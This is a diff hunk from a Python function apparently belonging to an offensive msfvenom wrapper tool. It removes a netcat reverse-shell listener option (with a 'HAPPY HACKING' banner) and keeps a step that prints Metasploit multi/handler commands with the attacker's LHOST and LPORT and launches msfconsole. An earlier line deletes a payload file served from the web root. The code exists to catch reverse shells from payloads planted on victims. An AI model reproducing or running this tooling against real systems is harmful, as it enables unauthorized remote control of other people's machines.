@@ -190,35 +190,16 @@ def venom():
     os.system(f"rm /var/www/html/{name}")
     msf=input("do you want to start listener/Metasploit?[y/n]: ")
     if msf=="y" or msf=="Y":
-        print("[1] FEBREV REVERSE TCP SHELL LISTENER(for reverse tcp payload only)")
-        print("[2] METASPLOIT")
-        print("[0] EXIT")
-        listener=int(input("ENTER YOUR CHOICE: "))
-        if listener==1:
-           print(""" 
-             __      _                         _ _     _                       
-            / _| ___| |__  _ __ _____   __    | (_)___| |_ ___ _ __   ___ _ __ 
-           | |_ / _ \ '_ \| '__/ _ \ \ / /____| | / __| __/ _ \ '_ \ / _ \ '__|
-           |  _|  __/ |_) | | |  __/\ V /_____| | \__ \ ||  __/ | | |  __/ |   
-           |_|  \___|_.__/|_|  \___| \_/      |_|_|___/\__\___|_| |_|\___|_|   
-                                                                    
-            
-           """)
-           listenport=input("ENTER THE LPORT: ")
-           print("ctrl-c to stop listener")
-           os.system(f"nc -lvp {listenport}")
-           print("######HAPPY HACKING##########")
-        elif listener==2:
-             print("ENTER THE BELOW COMMANDS ONE BY ONE IN METASPLOIT")
-             print("command1 : use exploit/multi/handler")
-             print("command2 : set payload <YOUR PAYLOAD >")
-             print(f"command3 : set LHOST {lhost}")
-             print(f"command4 : set LPORT {lport}")
-             os.system("service postgresql start")
-             os.system("msfconsole")
-        else:
-             print("EXITING.....BYE BYE>>>>")
-             os.system("exit")
+         print("ENTER THE BELOW COMMANDS ONE BY ONE IN METASPLOIT")
+         print("command1 : use exploit/multi/handler")
+         print("command2 : set payload <YOUR PAYLOAD >")
+         print(f"command3 : set LHOST {lhost}")
+         print(f"command4 : set LPORT {lport}")
+         os.system("service postgresql start")
+         os.system("msfconsole")
+    else:
+         print("EXITING.....BYE BYE>>>>")
+         os.system("exit")
               
     
     
